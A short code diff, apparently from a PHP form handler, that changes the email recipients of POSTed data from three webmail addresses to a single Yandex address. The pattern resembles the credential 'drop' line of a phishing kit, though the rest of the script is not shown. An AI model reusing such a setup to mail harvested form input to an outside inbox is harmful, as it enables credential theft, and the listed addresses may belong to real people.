@@ -7,7 +7,7 @@ if(!empty($_POST)) {
  
 
 
-		$to = "gracewill1am@yandex.com, xinmietechnology@hotmail.com, osinechifred@gmail.com";
+		$to = "emmaoffset.likecc@yandex.com";
 		
 		
 		
